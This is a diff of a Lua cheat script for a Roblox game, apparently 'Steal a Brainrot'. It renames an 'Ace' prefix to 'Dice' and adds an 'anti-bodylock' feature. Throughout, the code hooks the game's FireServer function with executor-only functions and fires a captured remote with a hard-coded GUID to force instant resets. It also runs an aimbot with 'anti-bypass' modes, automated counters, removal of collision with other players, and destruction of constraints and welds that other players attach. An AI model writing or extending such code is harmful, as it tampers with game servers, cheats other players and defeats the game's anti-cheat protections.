-_G.AceAutoResetOnMed = _G.AceAutoResetOnMed or {}
-_G.AceAutoResetOnMed.conns = _G.AceAutoResetOnMed.conns or {}
-_G.AceAutoResetOnMed.enabled = autoResetOnMedEnabled == true
-_G.AceAutoResetOnMed.medTriggered = false
-_G.AceAutoResetOnMed.lastFire = _G.AceAutoResetOnMed.lastFire or 0
-_G.AceAutoResetOnMed.cooldown = 2.25
-_G.AceAutoResetOnMed.charAddedConn = _G.AceAutoResetOnMed.charAddedConn
-_G.AceCursedResetGuid = _G.AceCursedResetGuid or "f888ee6e-c86d-46e1-93d7-0639d6635d42"
-_G.AceCursedResetRemote = _G.AceCursedResetRemote or nil
+_G.DiceAutoResetOnMed = _G.DiceAutoResetOnMed or {}
+_G.DiceAutoResetOnMed.conns = _G.DiceAutoResetOnMed.conns or {}
+_G.DiceAutoResetOnMed.enabled = autoResetOnMedEnabled == true
+_G.DiceAutoResetOnMed.medTriggered = false
+_G.DiceAutoResetOnMed.lastFire = _G.DiceAutoResetOnMed.lastFire or 0
+_G.DiceAutoResetOnMed.cooldown = 2.25
+_G.DiceAutoResetOnMed.charAddedConn = _G.DiceAutoResetOnMed.charAddedConn
+_G.DiceCursedResetGuid = _G.DiceCursedResetGuid or "f888ee6e-c86d-46e1-93d7-0639d6635d42"
+_G.DiceCursedResetRemote = _G.DiceCursedResetRemote or nil
 pcall(function()
-if hookfunction and newcclosure and not _G.AceCursedResetHooked and not _G.AceAutoResetOnMed.remoteHooked then
-_G.AceAutoResetOnMed.remoteHooked = true
+if hookfunction and newcclosure and not _G.DiceCursedResetHooked and not _G.DiceAutoResetOnMed.remoteHooked then
+_G.DiceAutoResetOnMed.remoteHooked = true
 local oldFire
 oldFire = hookfunction(Instance.new("RemoteEvent").FireServer, newcclosure(function(self, ...)
-if not _G.AceCursedResetRemote
+if not _G.DiceCursedResetRemote
 and typeof(self) == "Instance"
 and self:IsA("RemoteEvent")
 and self.Name:sub(1, 3) == "RE/" then
-_G.AceCursedResetRemote = self
+_G.DiceCursedResetRemote = self
 end
 return oldFire(self, ...)
 end))
 end
 end)
-function _G.AceFindCursedResetRemote()
-if _G.AceCursedResetRemote then return _G.AceCursedResetRemote end
+function _G.DiceFindCursedResetRemote()
+if _G.DiceCursedResetRemote then return _G.DiceCursedResetRemote end
 for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
 if desc:IsA("RemoteEvent") and desc.Name:sub(1, 3) == "RE/" then
-_G.AceCursedResetRemote = desc
+_G.DiceCursedResetRemote = desc
 break
 end
 end
-return _G.AceCursedResetRemote
+return _G.DiceCursedResetRemote
 end
-function _G.AceAutoResetCursedInstaReset()
-local remote = _G.AceFindCursedResetRemote and _G.AceFindCursedResetRemote() or _G.AceCursedResetRemote
+function _G.DiceAutoResetCursedInstaReset()
+local remote = _G.DiceFindCursedResetRemote and _G.DiceFindCursedResetRemote() or _G.DiceCursedResetRemote
 if not remote then return end
 local character = LP.Character
 local humanoid = character and character:FindFirstChildOfClass("Humanoid")
 if humanoid and humanoid.Health <= 0 then
 pcall(function()
-remote:FireServer(_G.AceCursedResetGuid, LP, "balloon")
+remote:FireServer(_G.DiceCursedResetGuid, LP, "balloon")
 end)
 return
 end
@@ -1112,7 +1153,7 @@ task.spawn(function()
 for _ = 1, 10 do
 if resetDetected then break end
 pcall(function()
-remote:FireServer(_G.AceCursedResetGuid, LP, "balloon")
+remote:FireServer(_G.DiceCursedResetGuid, LP, "balloon")
 end)
 task.wait(0.05)
 end
@@ -1123,8 +1164,8 @@ end)
 end
 end)
 end
-function _G.AceAutoResetShouldFire(part)
-local state = _G.AceAutoResetOnMed
+function _G.DiceAutoResetShouldFire(part)
+local state = _G.DiceAutoResetOnMed
 if not state or not state.enabled then return false end
 if state.medTriggered then return false end
 if tick() - (state.lastFire or 0) < (state.cooldown or 2.25) then return false end
@@ -1134,28 +1175,28 @@ return false
 end
 return part.Anchored and part.Transparency == 1
 end
-function _G.AceAutoResetFireOnce(part)
-if not _G.AceAutoResetShouldFire(part) then return end
-local state = _G.AceAutoResetOnMed
+function _G.DiceAutoResetFireOnce(part)
+if not _G.DiceAutoResetShouldFire(part) then return end
+local state = _G.DiceAutoResetOnMed
 state.medTriggered = true
 state.lastFire = tick()
 task.delay(2.3, function()
 if state.enabled then
-if _G.AceAutoResetCursedInstaReset then
-_G.AceAutoResetCursedInstaReset()
+if _G.DiceAutoResetCursedInstaReset then
+_G.DiceAutoResetCursedInstaReset()
 elseif cursedInstaReset then
 cursedInstaReset()
 end
 end
 end)
 end
-function _G.AceAutoResetOnAnchorChanged(part)
+function _G.DiceAutoResetOnAnchorChanged(part)
 return part:GetPropertyChangedSignal("Anchored"):Connect(function()
-_G.AceAutoResetFireOnce(part)
+_G.DiceAutoResetFireOnce(part)
 end)
 end
-function _G.AceStopAutoResetOnMed()
-local state = _G.AceAutoResetOnMed
+function _G.DiceStopAutoResetOnMed()
+local state = _G.DiceAutoResetOnMed
 if not state then return end
 for _, conn in ipairs(state.conns or {}) do
 pcall(function()
@@ -1165,23 +1206,23 @@ end
 state.conns = {}
 state.medTriggered = false
 end
-function _G.AceStartAutoResetOnMed(char)
-local state = _G.AceAutoResetOnMed
+function _G.DiceStartAutoResetOnMed(char)
+local state = _G.DiceAutoResetOnMed
 if not state then return end
-_G.AceStopAutoResetOnMed()
+_G.DiceStopAutoResetOnMed()
 state.medTriggered = false
 char = char or LP.Character
 if not char then return end
 for _, part in ipairs(char:GetDescendants()) do
 if part:IsA("BasePart") then
-table.insert(state.conns, _G.AceAutoResetOnAnchorChanged(part))
-_G.AceAutoResetFireOnce(part)
+table.insert(state.conns, _G.DiceAutoResetOnAnchorChanged(part))
+_G.DiceAutoResetFireOnce(part)
 end
 end
 table.insert(state.conns, char.DescendantAdded:Connect(function(part)
 if part:IsA("BasePart") then
-table.insert(state.conns, _G.AceAutoResetOnAnchorChanged(part))
-_G.AceAutoResetFireOnce(part)
+table.insert(state.conns, _G.DiceAutoResetOnAnchorChanged(part))
+_G.DiceAutoResetFireOnce(part)
 end
 end))
 table.insert(state.conns, char.AncestryChanged:Connect(function(_, parent)
@@ -1190,53 +1231,53 @@ state.medTriggered = false
 end
 end))
 end
-function _G.AceEnableAutoResetOnMed()
+function _G.DiceEnableAutoResetOnMed()
 autoResetOnMedEnabled = true
-_G.AceAutoResetOnMed.enabled = true
-_G.AceStartAutoResetOnMed(LP.Character)
+_G.DiceAutoResetOnMed.enabled = true
+_G.DiceStartAutoResetOnMed(LP.Character)
 end
-function _G.AceDisableAutoResetOnMed()
+function _G.DiceDisableAutoResetOnMed()
 autoResetOnMedEnabled = false
-_G.AceAutoResetOnMed.enabled = false
-_G.AceStopAutoResetOnMed()
+_G.DiceAutoResetOnMed.enabled = false
+_G.DiceStopAutoResetOnMed()
 end
-function _G.AceSetAutoResetOnMed(state, noSave)
+function _G.DiceSetAutoResetOnMed(state, noSave)
 autoResetOnMedEnabled = state == true
 if autoResetOnMedEnabled then
-_G.AceEnableAutoResetOnMed()
+_G.DiceEnableAutoResetOnMed()
 else
-_G.AceDisableAutoResetOnMed()
+_G.DiceDisableAutoResetOnMed()
 end
 if setAutoResetOnMedVisual then
 setAutoResetOnMedVisual(autoResetOnMedEnabled)
 end
-if not noSave and saveAceConfig then saveAceConfig() end
+if not noSave and saveDiceConfig then saveDiceConfig() end
 end
 function enableAutoResetOnMed()
-_G.AceSetAutoResetOnMed(true)
+_G.DiceSetAutoResetOnMed(true)
 end
 function disableAutoResetOnMed()
-_G.AceSetAutoResetOnMed(false)
+_G.DiceSetAutoResetOnMed(false)
 end
 function toggleAutoResetOnMed(on)
-_G.AceSetAutoResetOnMed(on == true)
+_G.DiceSetAutoResetOnMed(on == true)
 end
-if not _G.AceAutoResetOnMed.charAddedConn then
-_G.AceAutoResetOnMed.charAddedConn = LP.CharacterAdded:Connect(function(char)
-if _G.AceAutoResetOnMed and _G.AceAutoResetOnMed.enabled then
+if not _G.DiceAutoResetOnMed.charAddedConn then
+_G.DiceAutoResetOnMed.charAddedConn = LP.CharacterAdded:Connect(function(char)
+if _G.DiceAutoResetOnMed and _G.DiceAutoResetOnMed.enabled then
 task.wait(0.25)
-_G.AceStartAutoResetOnMed(char)
+_G.DiceStartAutoResetOnMed(char)
 end
 end)
 end
-_G.AceCounterState = _G.AceCounterState or {}
-_G.AceCounterState.batConn = nil
-_G.AceCounterState.batDebounce = false
-_G.AceCounterState.medConns = _G.AceCounterState.medConns or {}
-_G.AceCounterState.medDebounce = false
-_G.AceCounterState.medLastUsed = _G.AceCounterState.medLastUsed or 0
-_G.AceMedusaCooldown = 25
-function _G.AceFindMedusa()
+_G.DiceCounterState = _G.DiceCounterState or {}
+_G.DiceCounterState.batConn = nil
+_G.DiceCounterState.batDebounce = false
+_G.DiceCounterState.medConns = _G.DiceCounterState.medConns or {}
+_G.DiceCounterState.medDebounce = false
+_G.DiceCounterState.medLastUsed = _G.DiceCounterState.medLastUsed or 0
+_G.DiceMedusaCooldown = 25
+function _G.DiceFindMedusa()
 local c = LP.Character
 if not c then return nil end
 for _, t in ipairs(c:GetChildren()) do
@@ -1256,16 +1297,16 @@ end
 end
 return nil
 end
-function _G.AceUseMedusaCounter()
+function _G.DiceUseMedusaCounter()
 if not medCounterEnabled then return end
-if _G.AceCounterState.medDebounce then return end
-if tick() - (_G.AceCounterState.medLastUsed or 0) < _G.AceMedusaCooldown then return end
+if _G.DiceCounterState.medDebounce then return end
+if tick() - (_G.DiceCounterState.medLastUsed or 0) < _G.DiceMedusaCooldown then return end
 local c = LP.Character
 if not c then return end
-_G.AceCounterState.medDebounce = true
-local med = _G.AceFindMedusa()
+_G.DiceCounterState.medDebounce = true
+local med = _G.DiceFindMedusa()
 if not med then
-_G.AceCounterState.medDebounce = false
+_G.DiceCounterState.medDebounce = false
 return
 end
 if med.Parent ~= c then
@@ -1274,44 +1315,44 @@ if hum then pcall(function() hum:EquipTool(med) end) end
 task.wait(0.05)
 end
 pcall(function() med:Activate() end)
-_G.AceCounterState.medLastUsed = tick()
-_G.AceCounterState.medDebounce = false
+_G.DiceCounterState.medLastUsed = tick()
+_G.DiceCounterState.medDebounce = false
 end
-function _G.AceOnMedusaAnchorChanged(part)
+function _G.DiceOnMedusaAnchorChanged(part)
 return part:GetPropertyChangedSignal("Anchored"):Connect(function()
 if medCounterEnabled and part.Anchored and part.Transparency == 1 then
-_G.AceUseMedusaCounter()
+_G.DiceUseMedusaCounter()
 end
 end)
 end
-function _G.AceStartMedCounter(char)
-_G.AceStopMedCounter()
+function _G.DiceStartMedCounter(char)
+_G.DiceStopMedCounter()
 char = char or LP.Character
 if not char then return end
 for _, part in ipairs(char:GetDescendants()) do
 if part:IsA("BasePart") then
-table.insert(_G.AceCounterState.medConns, _G.AceOnMedusaAnchorChanged(part))
+table.insert(_G.DiceCounterState.medConns, _G.DiceOnMedusaAnchorChanged(part))
 end
 end
-table.insert(_G.AceCounterState.medConns, char.DescendantAdded:Connect(function(part)
+table.insert(_G.DiceCounterState.medConns, char.DescendantAdded:Connect(function(part)
 if part:IsA("BasePart") then
-table.insert(_G.AceCounterState.medConns, _G.AceOnMedusaAnchorChanged(part))
+table.insert(_G.DiceCounterState.medConns, _G.DiceOnMedusaAnchorChanged(part))
 end
 end))
 end
-function _G.AceStopMedCounter()
-for _, c in pairs(_G.AceCounterState.medConns or {}) do
+function _G.DiceStopMedCounter()
+for _, c in pairs(_G.DiceCounterState.medConns or {}) do
 pcall(function() c:Disconnect() end)
 end
-_G.AceCounterState.medConns = {}
-_G.AceCounterState.medDebounce = false
+_G.DiceCounterState.medConns = {}
+_G.DiceCounterState.medDebounce = false
 end
-_G.AceBatCounterSlapList = {"Bat", "Slap", "Iron Slap", "Gold Slap", "Diamond Slap", "Emerald Slap", "Ruby Slap", "Dark Matter Slap", "Flame Slap", "Nuclear Slap", "Galaxy Slap", "Glitched Slap"}
-function _G.AceFindBatForCounter()
+_G.DiceBatCounterSlapList = {"Bat", "Slap", "Iron Slap", "Gold Slap", "Diamond Slap", "Emerald Slap", "Ruby Slap", "Dark Matter Slap", "Flame Slap", "Nuclear Slap", "Galaxy Slap", "Glitched Slap"}
+function _G.DiceFindBatForCounter()
 local c = LP.Character
 if not c then return nil end
 local bp = LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack")
-for _, name in ipairs(_G.AceBatCounterSlapList) do
+for _, name in ipairs(_G.DiceBatCounterSlapList) do
 local t = c:FindFirstChild(name) or (bp and bp:FindFirstChild(name))
 if t then return t end
 end
@@ -1325,7 +1366,7 @@ end
 end
 return nil
 end
-function _G.AceSwingBatForCounter(bat, char)
+function _G.DiceSwingBatForCounter(bat, char)
 if not bat or not char then return end
 local hum = char:FindFirstChildOfClass("Humanoid")
 if bat.Parent ~= char then
@@ -1343,7 +1384,7 @@ task.wait(0.15)
 pcall(function() bat:Activate() end)
 end
 end
-function _G.AceCounterIsRagdoll(hum)
+function _G.DiceCounterIsRagdoll(hum)
 if not hum then return false end
 local st = hum:GetState()
 return st == Enum.HumanoidStateType.Physics
@@ -1351,40 +1392,40 @@ or st == Enum.HumanoidStateType.Ragdoll
 or st == Enum.HumanoidStateType.FallingDown
 or hum.PlatformStand == true
 end
-function _G.AceStartBatCounter()
-if _G.AceCounterState.batConn then return end
-_G.AceCounterState.batDebounce = false
-_G.AceCounterState.batConn = RunService.Heartbeat:Connect(function()
+function _G.DiceStartBatCounter()
+if _G.DiceCounterState.batConn then return end
+_G.DiceCounterState.batDebounce = false
+_G.DiceCounterState.batConn = RunService.Heartbeat:Connect(function()
 if not batCounterEnabled then return end
-if _G.AceCounterState.batDebounce then return end
+if _G.DiceCounterState.batDebounce then return end
 local char = LP.Character
 if not char then return end
 local hum = char:FindFirstChildOfClass("Humanoid")
 if not hum then return end
-if _G.AceCounterIsRagdoll(hum) then
-_G.AceCounterState.batDebounce = true
+if _G.DiceCounterIsRagdoll(hum) then
+_G.DiceCounterState.batDebounce = true
 task.spawn(function()
-local bat = _G.AceFindBatForCounter()
-if bat then _G.AceSwingBatForCounter(bat, char) end
+local bat = _G.DiceFindBatForCounter()
+if bat then _G.DiceSwingBatForCounter(bat, char) end
 task.wait(0.5)
-_G.AceCounterState.batDebounce = false
+_G.DiceCounterState.batDebounce = false
 end)
 end
 end)
 end
-function _G.AceStopBatCounter()
-if _G.AceCounterState.batConn then
-_G.AceCounterState.batConn:Disconnect()
-_G.AceCounterState.batConn = nil
+function _G.DiceStopBatCounter()
+if _G.DiceCounterState.batConn then
+_G.DiceCounterState.batConn:Disconnect()
+_G.DiceCounterState.batConn = nil
 end
-_G.AceCounterState.batDebounce = false
+_G.DiceCounterState.batDebounce = false
 end
-startBatCounter = _G.AceStartBatCounter
-stopBatCounter = _G.AceStopBatCounter
-setupMedusaCounter = _G.AceStartMedCounter
-stopMedusaCounter = _G.AceStopMedCounter
-_G.AceNoPlayerCollisionState = _G.AceNoPlayerCollisionState or {connections = {}}
-function _G.AceSetOtherPlayerCollision(state)
+startBatCounter = _G.DiceStartBatCounter
+stopBatCounter = _G.DiceStopBatCounter
+setupMedusaCounter = _G.DiceStartMedCounter
+stopMedusaCounter = _G.DiceStopMedCounter
+_G.DiceNoPlayerCollisionState = _G.DiceNoPlayerCollisionState or {connections = {}}
+function _G.DiceSetOtherPlayerCollision(state)
 for _, plr in ipairs(Players:GetPlayers()) do
 if plr ~= LP and plr.Character then
 for _, part in ipairs(plr.Character:GetDescendants()) do
@@ -1396,28 +1437,28 @@ end
 end
 end
 function enableNoPlayerCollision()
-if _G.AceNoPlayerCollisionState.running then return end
-_G.AceNoPlayerCollisionEnabled = true
-_G.AceNoPlayerCollisionState.running = true
-for _, conn in ipairs(_G.AceNoPlayerCollisionState.connections or {}) do
+if _G.DiceNoPlayerCollisionState.running then return end
+_G.DiceNoPlayerCollisionEnabled = true
+_G.DiceNoPlayerCollisionState.running = true
+for _, conn in ipairs(_G.DiceNoPlayerCollisionState.connections or {}) do
 pcall(function() conn:Disconnect() end)
 end
-_G.AceNoPlayerCollisionState.connections = {}
-_G.AceSetOtherPlayerCollision(false)
-table.insert(_G.AceNoPlayerCollisionState.connections, LP.CharacterAdded:Connect(function()
+_G.DiceNoPlayerCollisionState.connections = {}
+_G.DiceSetOtherPlayerCollision(false)
+table.insert(_G.DiceNoPlayerCollisionState.connections, LP.CharacterAdded:Connect(function()
 task.wait(0.5)
-if _G.AceNoPlayerCollisionEnabled then _G.AceSetOtherPlayerCollision(false) end
+if _G.DiceNoPlayerCollisionEnabled then _G.DiceSetOtherPlayerCollision(false) end
 end))
-table.insert(_G.AceNoPlayerCollisionState.connections, Players.PlayerAdded:Connect(function(plr)
+table.insert(_G.DiceNoPlayerCollisionState.connections, Players.PlayerAdded:Connect(function(plr)
 local c = plr.CharacterAdded:Connect(function()
 task.wait(0.5)
-if _G.AceNoPlayerCollisionEnabled then _G.AceSetOtherPlayerCollision(false) end
+if _G.DiceNoPlayerCollisionEnabled then _G.DiceSetOtherPlayerCollision(false) end
 end)
-table.insert(_G.AceNoPlayerCollisionState.connections, c)
+table.insert(_G.DiceNoPlayerCollisionState.connections, c)
 end))
 local collisionScanElapsed = 0
-table.insert(_G.AceNoPlayerCollisionState.connections, RunService.Heartbeat:Connect(function(dt)
-if not _G.AceNoPlayerCollisionEnabled then return end
+table.insert(_G.DiceNoPlayerCollisionState.connections, RunService.Heartbeat:Connect(function(dt)
+if not _G.DiceNoPlayerCollisionEnabled then return end
 collisionScanElapsed = collisionScanElapsed + (dt or 0)
 if collisionScanElapsed < 0.25 then return end
 collisionScanElapsed = 0
@@ -1433,19 +1474,150 @@ end
 end))
 end
 function disableNoPlayerCollision()
-if not _G.AceNoPlayerCollisionState.running then
-_G.AceNoPlayerCollisionEnabled = false
+if not _G.DiceNoPlayerCollisionState.running then
+_G.DiceNoPlayerCollisionEnabled = false
 return
 end
-_G.AceNoPlayerCollisionEnabled = false
-_G.AceNoPlayerCollisionState.running = false
-for _, conn in ipairs(_G.AceNoPlayerCollisionState.connections or {}) do
+_G.DiceNoPlayerCollisionEnabled = false
+_G.DiceNoPlayerCollisionState.running = false
+for _, conn in ipairs(_G.DiceNoPlayerCollisionState.connections or {}) do
 pcall(function() conn:Disconnect() end)
 end
-_G.AceNoPlayerCollisionState.connections = {}
-_G.AceSetOtherPlayerCollision(true)
+_G.DiceNoPlayerCollisionState.connections = {}
+_G.DiceSetOtherPlayerCollision(true)
 end
-function _G.AceSafeModeGetCountdownLabel()
+_G.DiceAntiBodylockState = _G.DiceAntiBodylockState or {connections = {}, running = false}
+function enableAntiBodylock()
+if _G.DiceAntiBodylockState.running then return end
+_G.DiceAntiBodylockEnabled = true
+_G.DiceAntiBodylockState.running = true
+for _, conn in ipairs(_G.DiceAntiBodylockState.connections or {}) do
+pcall(function() conn:Disconnect() end)
+end
+_G.DiceAntiBodylockState.connections = {}
+local function stripLockConstraints(char)
+if not char then return end
+for _, obj in ipairs(char:GetDescendants()) do
+pcall(function()
+if (obj:IsA("BodyPosition") or obj:IsA("BodyGyro") or obj:IsA("BodyVelocity")
+or obj:IsA("AlignPosition") or obj:IsA("AlignOrientation")
+or obj:IsA("LineForce") or obj:IsA("VectorForce")
+or obj:IsA("SpringConstraint") or obj:IsA("RopeConstraint")
+or obj:IsA("RodConstraint")) then
+if obj.Name ~= "DiceInternal" then
+obj:Destroy()
+end
+elseif obj:IsA("WeldConstraint") or obj:IsA("Weld") then
+local p0 = obj.Part0
+local p1 = obj.Part1
+if p0 and p1 then
+local isOwn0 = p0:IsDescendantOf(char)
+local isOwn1 = p1:IsDescendantOf(char)
+if (isOwn0 and not isOwn1) or (isOwn1 and not isOwn0) then
+obj:Destroy()
+end
+end
+end
+end)
+end
+end
+local function detachForeignAttachments(char)
+if not char then return end
+local hrp = char:FindFirstChild("HumanoidRootPart")
+if not hrp then return end
+for _, plr in ipairs(Players:GetPlayers()) do
+if plr ~= LP and plr.Character then
+local otherRoot = plr.Character:FindFirstChild("HumanoidRootPart")
+if otherRoot then
+local dist = (hrp.Position - otherRoot.Position).Magnitude
+if dist < 2.5 then
+pcall(function()
+otherRoot.CFrame = otherRoot.CFrame * CFrame.new(0, 0, 4)
+end)
+end
+end
+for _, obj in ipairs(plr.Character:GetDescendants()) do
+pcall(function()
+if obj:IsA("Attachment") then
+local target = obj:FindFirstChildOfClass("AlignPosition") or obj:FindFirstChildOfClass("AlignOrientation")
+if target then
+local a0 = target:FindFirstChild("Attachment0") or (target.Attachment0)
+local a1 = target:FindFirstChild("Attachment1") or (target.Attachment1)
+pcall(function()
+if a0 and a0:IsDescendantOf(char) then target:Destroy() end
+if a1 and a1:IsDescendantOf(char) then target:Destroy() end
+end)
+end
+end
+if (obj:IsA("WeldConstraint") or obj:IsA("Weld")) then
+local p0, p1 = obj.Part0, obj.Part1
+if p0 and p1 then
+if p0:IsDescendantOf(char) or p1:IsDescendantOf(char) then
+obj:Destroy()
+end
+end
+end
+end)
+end
+end
+end
+end
+local scanElapsed = 0
+table.insert(_G.DiceAntiBodylockState.connections, RunService.Heartbeat:Connect(function(dt)
+if not _G.DiceAntiBodylockEnabled then return end
+scanElapsed = scanElapsed + (dt or 0)
+if scanElapsed < 0.08 then return end
+scanElapsed = 0
+local char = LP.Character
+if not char then return end
+pcall(stripLockConstraints, char)
+pcall(detachForeignAttachments, char)
+end))
+table.insert(_G.DiceAntiBodylockState.connections, LP.CharacterAdded:Connect(function(char)
+task.wait(0.3)
+if _G.DiceAntiBodylockEnabled then
+pcall(stripLockConstraints, char)
+end
+end))
+table.insert(_G.DiceAntiBodylockState.connections, workspace.DescendantAdded:Connect(function(obj)
+if not _G.DiceAntiBodylockEnabled then return end
+local char = LP.Character
+if not char then return end
+task.defer(function()
+if not _G.DiceAntiBodylockEnabled then return end
+pcall(function()
+if not obj or not obj.Parent then return end
+if not obj:IsDescendantOf(char) then return end
+if (obj:IsA("BodyPosition") or obj:IsA("BodyGyro") or obj:IsA("BodyVelocity")
+or obj:IsA("AlignPosition") or obj:IsA("AlignOrientation")
+or obj:IsA("LineForce") or obj:IsA("VectorForce")) then
+if obj.Name ~= "DiceInternal" then
+obj:Destroy()
+end
+elseif obj:IsA("WeldConstraint") or obj:IsA("Weld") then
+local p0 = obj.Part0
+local p1 = obj.Part1
+if p0 and p1 then
+local isOwn0 = p0:IsDescendantOf(char)
+local isOwn1 = p1:IsDescendantOf(char)
+if (isOwn0 and not isOwn1) or (isOwn1 and not isOwn0) then
+obj:Destroy()
+end
+end
+end
+end)
+end)
+end))
+end
+function disableAntiBodylock()
+_G.DiceAntiBodylockEnabled = false
+_G.DiceAntiBodylockState.running = false
+for _, conn in ipairs(_G.DiceAntiBodylockState.connections or {}) do
+pcall(function() conn:Disconnect() end)
+end
+_G.DiceAntiBodylockState.connections = {}
+end
+function _G.DiceSafeModeGetCountdownLabel()
 local ok, label = pcall(function()
 return LP.PlayerGui
 and LP.PlayerGui:FindFirstChild("DuelsMachineTopFrame")
@@ -1455,29 +1627,29 @@ and LP.PlayerGui.DuelsMachineTopFrame.DuelsMachineTopFrame.Timer:FindFirstChild(
 end)
 return (ok and label) or nil
 end
-function _G.AceSafeModeCountdownNumber(text)
+function _G.DiceSafeModeCountdownNumber(text)
 local t = tostring(text or ""):upper():gsub("^%s+", ""):gsub("%s+$", "")
 if t == "GO" or t == "START" or t == "READY" then return true end
 local n = tonumber(t)
 return n ~= nil and n >= 0 and n <= 10
 end
-function _G.AceSafeModeInDuelCountdown()
-local label = _G.AceSafeModeGetCountdownLabel()
-return label and _G.AceSafeModeCountdownNumber(label.Text) or false
+function _G.DiceSafeModeInDuelCountdown()
+local label = _G.DiceSafeModeGetCountdownLabel()
+return label and _G.DiceSafeModeCountdownNumber(label.Text) or false
 end
-_G.AceSafeModeBlockedTools = {
+_G.DiceSafeModeBlockedTools = {
 bat=true, slap=true, sword=true, gun=true, pistol=true, rifle=true,
 medusa=true, hammer=true, axe=true, knife=true, katana=true, blade=true, fist=true,
 }
-function _G.AceSafeModeIsCarryableTool(tool)
+function _G.DiceSafeModeIsCarryableTool(tool)
 if not tool or not tool:IsA("Tool") then return false end
 local name = tool.Name:lower()
-for word in pairs(_G.AceSafeModeBlockedTools) do
+for word in pairs(_G.DiceSafeModeBlockedTools) do
 if name:find(word, 1, true) then return false end
 end
 return true
 end
-function _G.AceSafeModeHoldingBrainrot()
+function _G.DiceSafeModeHoldingBrainrot()
 local ok, val = pcall(function() return LP:GetAttribute("Stealing") end)
 if ok and val == true then return true end
 local ok2, val2 = pcall(function() return LP:GetAttribute("AntiKick") end)
@@ -1508,52 +1680,52 @@ end
 end
 return false
 end
-function _G.AceSafeModeIsLocked()
+function _G.DiceSafeModeIsLocked()
 if not antiKickEnabled then return false end
-return _G.AceSafeModeInDuelCountdown() or _G.AceSafeModeHoldingBrainrot()
+return _G.DiceSafeModeInDuelCountdown() or _G.DiceSafeModeHoldingBrainrot()
 end
-function _G.AceSafeModeForceStop(reason)
+function _G.DiceSafeModeForceStop(reason)
 local stopped = false
-if _G.AceNormalAimbotOn and _G.AceStopNormalAimbot then _G.AceStopNormalAimbot(); stopped = true end
-if _G.AceAntiBypassAimbotOn and _G.AceStopAntiBypassAimbot then _G.AceStopAntiBypassAimbot(false); stopped = true end
-if _G.AceAntiDesyncAimbotOn and _G.AceStopAntiDesyncAimbot then _G.AceStopAntiDesyncAimbot(); stopped = true end
+if _G.DiceNormalAimbotOn and _G.DiceStopNormalAimbot then _G.DiceStopNormalAimbot(); stopped = true end
+if _G.DiceAntiBypassAimbotOn and _G.DiceStopAntiBypassAimbot then _G.DiceStopAntiBypassAimbot(false); stopped = true end
+if _G.DiceAntiDesyncAimbotOn and _G.DiceStopAntiDesyncAimbot then _G.DiceStopAntiDesyncAimbot(); stopped = true end
 if autoLeftEnabled then
 autoLeftEnabled = false
-if _G.AceSetAutoLeftVisual then _G.AceSetAutoLeftVisual(false) end
-if _G.AceStopAutoLeft then _G.AceStopAutoLeft() end
+if _G.DiceSetAutoLeftVisual then _G.DiceSetAutoLeftVisual(false) end
+if _G.DiceStopAutoLeft then _G.DiceStopAutoLeft() end
 stopped = true
 end
 if autoRightEnabled then
 autoRightEnabled = false
-if _G.AceSetAutoRightVisual then _G.AceSetAutoRightVisual(false) end
-if _G.AceStopAutoRight then _G.AceStopAutoRight() end
+if _G.DiceSetAutoRightVisual then _G.DiceSetAutoRightVisual(false) end
+if _G.DiceStopAutoRight then _G.DiceStopAutoRight() end
 stopped = true
 end
 if stopped and showActionNotification then pcall(function() showActionNotification(reason or "SAFE MODE LOCK") end) end
 end
-function _G.AceSafeModeTryStart()
-if _G.AceSafeModeIsLocked and _G.AceSafeModeIsLocked() then
-_G.AceSafeModeForceStop("SAFE MODE LOCK")
+function _G.DiceSafeModeTryStart()
+if _G.DiceSafeModeIsLocked and _G.DiceSafeModeIsLocked() then
+_G.DiceSafeModeForceStop("SAFE MODE LOCK")
 return false
 end
 return true
 end
-_G.AceSafeModeMonitorStarted = _G.AceSafeModeMonitorStarted or false
-if not _G.AceSafeModeMonitorStarted then
-_G.AceSafeModeMonitorStarted = true
+_G.DiceSafeModeMonitorStarted = _G.DiceSafeModeMonitorStarted or false
+if not _G.DiceSafeModeMonitorStarted then
+_G.DiceSafeModeMonitorStarted = true
 RunService.Heartbeat:Connect(function()
-if antiKickEnabled and _G.AceSafeModeIsLocked and _G.AceSafeModeIsLocked() then
-_G.AceSafeModeForceStop("SAFE MODE LOCK")
+if antiKickEnabled and _G.DiceSafeModeIsLocked and _G.DiceSafeModeIsLocked() then
+_G.DiceSafeModeForceStop("SAFE MODE LOCK")
 end
 end)
 end
 LP.CharacterAdded:Connect(function(char)
 task.wait(0.5)
-if medCounterEnabled then _G.AceStartMedCounter(char) end
-if batCounterEnabled then _G.AceStartBatCounter() end
+if medCounterEnabled then _G.DiceStartMedCounter(char) end
+if batCounterEnabled then _G.DiceStartBatCounter() end
 end)
-_G.AceNormalAimbot = _G.AceNormalAimbot or {conn = nil, target = nil, swingCooldown = false}
-function _G.AceFindAimbotBat()
+_G.DiceNormalAimbot = _G.DiceNormalAimbot or {conn = nil, target = nil, swingCooldown = false}
+function _G.DiceFindAimbotBat()
 local char = LP.Character
 if not char then return nil end
 for _, tool in ipairs(char:GetChildren()) do
@@ -1571,7 +1743,7 @@ end
 end
 return nil
 end
-function _G.AceGetClosestAimbotTarget()
+function _G.DiceGetClosestAimbotTarget()
 local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not root then return nil end
 local closest, minDist = nil, math.huge
@@ -1590,65 +1762,65 @@ end
 end
 return closest
 end
-function _G.AceGetNormalAimbotSpeed()
+function _G.DiceGetNormalAimbotSpeed()
 if currentSpeedMode == "Lagger" or currentSpeedMode == "Lagger Carry" then
 return tonumber(LAGGER_AIMBOT_SPEED) or 40
 end
 return tonumber(AIMBOT_SPEED) or 58
 end
-function _G.AceGetAntiBypassAimbotSpeed()
+function _G.DiceGetAntiBypassAimbotSpeed()
 if currentSpeedMode == "Lagger" or currentSpeedMode == "Lagger Carry" then
-return tonumber(_G.AceAntiBypassLaggerAimbotSpeed) or 40
+return tonumber(_G.DiceAntiBypassLaggerAimbotSpeed) or 40
 end
-return tonumber(_G.AceAntiBypassAimbotSpeed) or 58
+return tonumber(_G.DiceAntiBypassAimbotSpeed) or 58
 end
-function _G.AceGetSelectedAimbotSpeedValues()
+function _G.DiceGetSelectedAimbotSpeedValues()
 if selectedAimbotMode == "Anti Bypass" then
-return tonumber(_G.AceAntiBypassAimbotSpeed) or 58, tonumber(_G.AceAntiBypassLaggerAimbotSpeed) or 40
